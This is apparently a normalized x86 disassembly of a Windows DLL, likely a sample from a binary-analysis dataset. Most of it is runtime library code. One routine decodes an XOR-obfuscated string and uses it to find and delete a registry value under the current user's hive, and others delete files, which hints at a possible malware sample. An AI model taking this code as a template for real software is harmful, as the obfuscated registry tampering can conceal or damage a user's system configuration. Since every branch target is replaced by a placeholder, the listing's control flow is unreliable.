mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x20
sub_100074a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080ce9
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x18 ]
push eax
call sub_1003b1ca
mov ecx [ ebp - 0x18 ]
mov eax 0x51eb851f
mul ecx
mov eax edx
shr eax 0x3
mov dl 0x19
imul dl
sub cl al
mov eax [ esi + 0x10 ]
add esp 0x4
lea ebx [ ecx + 0x41 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
jbe r-xdata
push r--data
call sub_1002c5ed
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10016d10
jmp r-xdata
setne al
test al al
je r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
test edi edi
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
cmp eax [ ebp + 0xc ]
jb r-xdata
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax ] 0x0
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ eax + edi ] 0x0
sub_100075b8
push 0x28
mov eax sub_1007f332
call sub_100097c8
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x18
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
push ecx
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_100557be
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
sub_10007650
push ebp
mov ebp esp
sub esp 0x47c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
xor esi esi
mov [ ebp - 0x478 ] eax
mov [ ebp - 0x470 ] esi
xor eax eax
lea ecx [ ecx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff83
and edx 0xff
mov [ ebp + eax * 2 - 0x60 ] dx
inc eax
cmp eax 0x2d
jb r-xdata
lea ecx [ ebp - 0x46c ]
push ecx
push 0x2011b
push esi
lea edx [ ebp - 0x60 ]
push edx
xor eax eax
push 0x80000001
mov [ ebp - 0x6 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x46c ]
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x470 ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x470 ] esi
jbe r-xdata
mov edx [ ebp - 0x46c ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x46c ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
push edi
mov edi [ RegEnumValueW@IAT ]
lea ecx [ ecx ]
inc esi
cmp esi [ ebp - 0x470 ]
jb r-xdata
mov edx [ ebp - 0x478 ]
push edx
lea eax [ ebp - 0x268 ]
push eax
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x47c ]
push eax
lea ecx [ ebp - 0x268 ]
push ecx
mov ecx [ ebp - 0x46c ]
push 0x0
push 0x0
lea edx [ ebp - 0x474 ]
push edx
lea eax [ ebp - 0x468 ]
push eax
push esi
push ecx
mov [ ebp - 0x474 ] 0xff
mov [ ebp - 0x47c ] 0x208
call edi
test eax eax
jne r-xdata
pop edi
mov edx [ ebp - 0x46c ]
lea ecx [ ebp - 0x468 ]
push ecx
push edx
call [ RegDeleteValueW@IAT ]
sub_100077c6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_1007c2c0
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002fec0
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002fec0
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_100078a8
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_100677b7
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1000599d
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
sar eax 0x1
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_10007951
push 0x10
push r--data
call sub_10079bf0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1001d849
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_10079c35
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_100532a0
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_10041a88
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10007a22
mov eax [ ebp - 0x1c ]
call sub_1002ada5
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_10007a30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov esi [ edi ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
cmp eax ebx
jne r-xdata
cmp [ esi + 0x4 ] ebx
je r-xdata
mov edi eax
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov edi eax
mov [ esi + 0x4 ] eax
cmp edi ebx
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] ebx
jne r-xdata
xor esi esi
mov ecx [ ebp + 0x8 ]
mov [ esi ] r--data
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
call sub_10020a20
mov eax [ ebp + 0x8 ]
mov [ esi + 0xc ] ebx
mov [ esi ] r--data
mov ecx [ eax + 0xc ]
mov [ esi + 0xc ] ecx
jmp r-xdata
push 0x10
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ebp
retn 0x4
mov [ edi + 0x4 ] ebx
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov [ edi ] esi
cmp esi ebx
je r-xdata
sub_10007adc
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_10079a10
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_10058e83
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_10058e83
pop ecx
sub_10007c10
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
push edi
call sub_10010000
push edi
call sub_10032470
push edi
call sub_1003c6e0
mov esi [ ebp + 0x18 ]
add esp 0xc
mov [ esi ] 0xffffffff
mov [ esi + 0x4 ] 0xffffffff
push edi
cmp eax [ ebp + 0x10 ]
jne r-xdata
call sub_1003c6e0
inc eax
add esp 0x4
cmp eax 0x3d
ja r-xdata
call sub_10004030
add esp 0x4
pop edi
mov [ esi ] 0xffffffff
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
push edx
push eax
call sub_10078cd0
add esp 0xc
pop edi
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10007cc0 ]
jmp [ eax * 4 + jump_table_10007cb4 ]
push edi
call sub_10004030
add esp 0x4
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push ecx
mov ebx edi
call sub_100789b0
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10007d30
push ebp
mov ebp esp
push 0xffffffff
push sub_100808a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x8
push 0x0
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x30 ] eax
call sub_1004d2f0
mov ecx edi
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
mov esi [ eax + 0x10 ]
mov ebx ecx
mov ecx esi
cmp esi ebx
jb r-xdata
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov ecx ebx
push ecx
push edi
push eax
call sub_10050b90
add esp 0xc
test eax eax
jne r-xdata
mov eax [ eax ]
sete bl
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
cmp esi ebx
jae r-xdata
mov edx [ ebp - 0x30 ]
xor ecx ecx
test bl bl
setne cl
mov [ edx ] ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x2c ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
cmp esi ebx
setne al
or eax 0xffffffff
jmp r-xdata
test eax eax
sub_10007df0
push ebp
mov ebp esp
sub esp 0x228
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov ebx ecx
lea ecx [ ebp - 0x220 ]
xor edi edi
push ecx
lea edx [ ebp - 0x218 ]
push edx
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x228 ] edi
mov [ ebp - 0x218 ] edi
mov [ ebp - 0x220 ] edi
call sub_10015a50
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x220 ]
mov esi [ ebp - 0x218 ]
lea eax [ ebp - 0x21c ]
push eax
push ecx
push esi
lea ecx [ ebp - 0x228 ]
mov edx ebx
call sub_100041d0
test eax eax
je r-xdata
lea eax [ edi + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x218 ]
mov eax 0xb5
call sub_10013830
push edx
mov eax edx
push eax
mov ecx edx
mov edx [ rw-data ]
push ecx
push 0x1
push 0x1
push edx
lea eax [ ebp - 0x214 ]
mov [ ebp - 0x224 ] 0x1
call sub_1002ed80
test eax eax
jne r-xdata
cmp esi edi
je r-xdata
mov ebx [ HeapFree@IAT ]
cmp esi edi
je r-xdata
mov eax [ ebp - 0x228 ]
mov ecx [ ebp - 0x21c ]
push eax
push ecx
lea eax [ ebp - 0x214 ]
call sub_10031770
add esp 0x8
mov [ ebp - 0x224 ] eax
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push esi
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x21c ]
cmp eax edi
je r-xdata
push esi
push edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp [ ebp - 0x224 ] edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
lea edx [ ebp - 0x214 ]
push edx
call sub_10018ea0
test eax eax
je r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x214 ]
push ecx
call [ DeleteFileW@IAT ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x214 ]
push eax
call [ DeleteFileW@IAT ]
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
sub_10007fa4
push 0x28
mov eax sub_1007f66a
call sub_100097c8
and [ ebp - 0x10 ] 0x0
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
push 0x5
pop eax
call sub_1004db01
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x1c
call sub_10055606
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1005442b
jmp r-xdata
sub_10008045
push 0x3c
mov eax sub_1007f914
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1002b6c2
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100660be
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10069ce0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_10008102
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_1004ac7a
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_10008160
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x18 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x18 ]
mov [ edx + eax - 0x18 ] r--data
mov ecx [ eax - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x8 ] r--data
mov ecx [ eax - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x18 ] r--data
push eax
mov [ eax ] r--data
call sub_10058a25
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_100081b8
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_10023e65
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_10008200
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
cmp eax 0x1ffffffe
jb r-xdata
inc eax
push ebx
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ edi + 0x4 ] eax
mov edx [ ecx + 0x4 ]
xor bl bl
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x14 ]
push eax
call sub_1006591f
add esp 0x4
push r--data
call sub_1002c5ed
cmp [ ebp + 0xc ] bl
je r-xdata
mov [ edx + 0x4 ] edi
mov edx [ ecx + 0x4 ]
mov [ edx ] edi
mov eax [ ecx + 0x4 ]
mov [ eax + 0x8 ] edi
jmp r-xdata
mov [ eax + 0x8 ] edi
mov edx [ ecx + 0x4 ]
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ eax ] edi
mov edx [ ecx + 0x4 ]
cmp eax [ edx ]
jne r-xdata
mov edx [ edi + 0x4 ]
mov eax edi
cmp [ edx + 0x14 ] bl
jne r-xdata
mov [ edx + 0x8 ] edi
mov [ edx ] edi
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
mov [ ecx + 0x14 ] 0x1
pop ebx
pop ebp
retn 0x10
push esi
lea ebx [ ebx ]
mov esi [ esi ]
cmp [ esi + 0x14 ] bl
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] bl
jne r-xdata
cmp eax [ edx ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edx [ eax + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] bl
jne r-xdata
mov eax edx
mov edx [ eax ]
mov esi [ edx + 0x8 ]
mov [ eax ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] bl
jne r-xdata
mov edx [ eax + 0x4 ]
cmp [ edx + 0x14 ] bl
je r-xdata
mov edx [ eax + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] bl
jne r-xdata
mov eax edx
mov edx [ eax + 0x8 ]
mov esi [ edx ]
mov [ eax + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] bl
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ecx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ eax + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov edx [ eax + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ecx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ eax + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp eax [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ eax + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] eax
mov [ eax + 0x4 ] edx
sub_10008430
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_1002c5ed
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1002c5ed
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1004d170
test edi edi
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
push eax
push ebx
push ecx
mov ecx esi
call sub_10030910
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov eax esi
xor edx edx
mov [ eax + edi * 2 ] dx
mov eax [ esi ]
xor edx edx
mov [ eax + edi * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
xor edx edx
